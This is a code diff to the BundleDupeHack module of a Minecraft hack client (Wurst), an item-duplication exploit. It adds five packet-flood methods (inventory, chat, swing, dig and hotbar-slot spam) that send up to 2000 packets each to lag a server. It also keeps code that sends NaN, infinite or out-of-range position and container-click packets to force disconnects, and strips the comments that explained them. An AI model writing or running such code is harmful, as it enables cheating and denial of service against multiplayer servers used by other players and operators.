@@ -7,6 +7,7 @@
  */
 package net.wurstclient.hacks;
 
+import java.time.Instant;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -14,10 +15,13 @@ import java.util.concurrent.TimeUnit;
 import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
 import net.minecraft.client.multiplayer.ClientPacketListener;
 import net.minecraft.client.multiplayer.ClientLevel;
+import net.minecraft.core.BlockPos;
+import net.minecraft.core.Direction;
 import net.minecraft.network.HashedStack;
 import net.minecraft.network.protocol.Packet;
 import net.minecraft.network.protocol.common.ServerboundClientInformationPacket;
 import net.minecraft.network.protocol.common.ServerboundKeepAlivePacket;
+import net.minecraft.network.protocol.game.ServerboundChatPacket;
 import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
 import net.minecraft.network.protocol.game.ServerboundInteractPacket;
 import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
@@ -25,6 +29,7 @@ import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;
 import net.minecraft.network.protocol.game.ServerboundPlayerCommandPacket;
 import net.minecraft.network.protocol.game.ServerboundPlayerCommandPacket.Action;
 import net.minecraft.network.protocol.game.ServerboundSetCarriedItemPacket;
+import net.minecraft.network.protocol.game.ServerboundSwingPacket;
 import net.minecraft.server.level.ClientInformation;
 import net.minecraft.world.InteractionHand;
 import net.minecraft.world.entity.Entity;
@@ -94,6 +99,10 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 			"Amount of container click packets to send.", 200, 1, 1000, 1,
 			ValueDisplay.INTEGER);
 	
+	private final SliderSetting lagPackets = new SliderSetting("Other Lag packets",
+		"Amount of lag packets to spam for ALL methods (except custom).", 300,
+		100, 2000, 50, ValueDisplay.INTEGER);
+	
 	private boolean cancelKeepAlive;
 	private boolean dupeActivated;
 	private boolean waitingForKeepAlive;
@@ -115,6 +124,7 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 		addSetting(boatNbtPackets);
 		addSetting(entityNbtPackets);
 		addSetting(clickslotPackets);
+		addSetting(lagPackets);
 	}
 	
 	@Override
@@ -276,9 +286,6 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 				ClientPacketListener c = MC.getConnection();
 				if(c != null && MC.player != null)
 				{
-					// Send a movement packet with NaN/NaN positions and
-					// rotations to trigger an immediate decode/validation
-					// disconnect
 					c.send(new ServerboundMovePlayerPacket.PosRot(Double.NaN,
 						Double.NaN, Double.NaN, Float.NaN, Float.NaN,
 						MC.player.onGround(), false));
@@ -290,8 +297,6 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 				ClientPacketListener c = MC.getConnection();
 				if(c != null && MC.player != null)
 				{
-					// Infinity positions/rotations are rejected instantly on
-					// most servers
 					c.send(new ServerboundMovePlayerPacket.PosRot(
 						Double.POSITIVE_INFINITY, Double.NEGATIVE_INFINITY,
 						Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY,
@@ -304,8 +309,6 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 				ClientPacketListener c = MC.getConnection();
 				if(c != null && MC.player != null)
 				{
-					// Extremely out-of-bounds but finite coords often cause
-					// immediate "Illegal position" disconnects
 					double bx = 1.0E308, by = 1.0E308, bz = -1.0E308;
 					c.send(new ServerboundMovePlayerPacket.PosRot(bx, by, bz,
 						0.0f, 0.0f, MC.player.onGround(), false));
@@ -317,8 +320,6 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 				ClientPacketListener c = MC.getConnection();
 				if(c != null)
 				{
-					// Container id/state/slot wildly out of range -> many
-					// servers drop immediately
 					ServerboundContainerClickPacket p =
 						new ServerboundContainerClickPacket(-1,
 							Integer.MAX_VALUE, (short)Short.MAX_VALUE,
@@ -363,6 +364,11 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 			case BOAT_NBT -> sendBoatNbtPackets();
 			case CLICKSLOT -> sendClickslotPackets();
 			case ENTITY_NBT -> sendEntityNbtPackets();
+			case INVENTORY_SPAM -> sendInventorySpam();
+			case CHAT_FLOOD -> sendChatFlood();
+			case SWING_SPAM -> sendSwingSpam();
+			case DIG_SPAM -> sendDigSpam();
+			case SLOT_SPAM -> sendSlotSpam();
 		}
 	}
 	
@@ -423,6 +429,86 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 			"Sent " + clickslotPackets.getValueI() + " Clickslot packets.");
 	}
 	
+	private void sendInventorySpam()
+	{
+		ClientPacketListener c = MC.getConnection();
+		if(c == null || MC.player == null)
+			return;
+		
+		int count = lagPackets.getValueI();
+		for(int i = 0; i < count; i++)
+			c.send(new ServerboundPlayerCommandPacket(MC.player,
+				Action.OPEN_INVENTORY));
+		
+		ChatUtils.message("Sent " + count
+			+ " inventory open spam packets. (No boat needed!)");
+	}
+	
+	private void sendChatFlood()
+	{
+		ClientPacketListener c = MC.getConnection();
+		if(c == null)
+			return;
+		
+		String junk = "a".repeat(200);
+		int count = lagPackets.getValueI();
+		
+		for(int i = 0; i < count; i++)
+		{
+			c.send(
+				new ServerboundChatPacket(junk, Instant.now(), 0L, null, null));
+		}
+		
+		ChatUtils.message("Sent " + count + " chat flood packets. (Unsigned)");
+	}
+	
+	private void sendSwingSpam()
+	{
+		ClientPacketListener c = MC.getConnection();
+		if(c == null || MC.player == null)
+			return;
+		
+		int count = lagPackets.getValueI();
+		for(int i = 0; i < count; i++)
+			c.send(new ServerboundSwingPacket(InteractionHand.MAIN_HAND));
+		
+		ChatUtils.message("Sent " + count
+			+ " swing arm spam packets. (Harmless Netty flood!)");
+	}
+	
+	private void sendDigSpam()
+	{
+		ClientPacketListener c = MC.getConnection();
+		if(c == null || MC.player == null)
+			return;
+		
+		BlockPos pos = MC.player.blockPosition();
+		Direction dir = Direction.UP;
+		int count = lagPackets.getValueI();
+		for(int i = 0; i < count; i++)
+			c.send(new ServerboundPlayerActionPacket(
+				ServerboundPlayerActionPacket.Action.START_DESTROY_BLOCK, pos,
+				dir));
+		
+		ChatUtils.message("Sent " + count
+			+ " block dig spam packets. (Air block validation lag!)");
+	}
+	
+	private void sendSlotSpam()
+	{
+		ClientPacketListener c = MC.getConnection();
+		if(c == null)
+			return;
+		
+		java.util.Random rand = new java.util.Random();
+		int count = lagPackets.getValueI();
+		for(int i = 0; i < count; i++)
+			c.send(new ServerboundSetCarriedItemPacket(rand.nextInt(9)));
+		
+		ChatUtils.message("Sent " + count
+			+ " hotbar slot spam packets. (Server inv update lag!)");
+	}
+	
 	private void executeCommand(String command)
 	{
 		if(command == null)
@@ -462,6 +548,11 @@ public final class BundleDupeHack extends Hack implements PacketOutputListener
 		CUSTOM,
 		BOAT_NBT,
 		CLICKSLOT,
-		ENTITY_NBT
+		ENTITY_NBT,
+		INVENTORY_SPAM,
+		CHAT_FLOOD,
+		SWING_SPAM,
+		DIG_SPAM,
+		SLOT_SPAM
 	}
 }
